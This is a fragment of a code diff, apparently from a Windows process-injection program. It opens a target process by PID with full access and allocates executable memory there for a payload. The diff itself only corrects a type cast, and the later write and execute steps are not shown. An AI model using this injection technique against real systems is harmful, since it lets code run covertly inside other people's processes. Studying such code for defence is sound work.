@@ -47,7 +47,7 @@ int main(int argc, char* argv[]) {
 
   // parse process ID
   printf("PID: %i", atoi(argv[1]));
-  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
 
   // allocate memory buffer for remote process
   rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
